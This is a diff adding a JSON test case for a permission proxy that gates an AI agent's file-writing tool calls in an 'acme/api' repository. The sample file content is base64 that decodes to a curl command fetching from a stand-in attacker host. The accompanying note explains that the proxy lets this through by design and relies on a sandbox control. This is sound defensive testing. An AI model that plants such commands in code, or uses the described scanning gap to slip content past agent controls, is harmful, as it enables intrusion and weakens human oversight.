@@ -1,0 +1,28 @@
+{
+  "note": "ALLOWED at the proxy, by design. enforce.ts scans named destination fields only: a URL inside file content sends nothing anywhere, and scanning content would deny any commit touching a file with a link. R9b (the sandbox) is the control that holds here, and docs/enforced-where.md says so.",
+  "rule": {
+    "tool": "create_or_update_file",
+    "action": "contents.write",
+    "resources": [
+      "acme/api"
+    ],
+    "branches": [
+      "agent/42-*"
+    ],
+    "paths": [
+      "src/**"
+    ],
+    "denyPaths": [
+      ".github/workflows/**",
+      "**.env**"
+    ]
+  },
+  "args": {
+    "owner": "acme",
+    "repo": "api",
+    "branch": "agent/42-x",
+    "message": "m",
+    "content": "Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20veA==",
+    "path": "src/a.ts"
+  }
+}
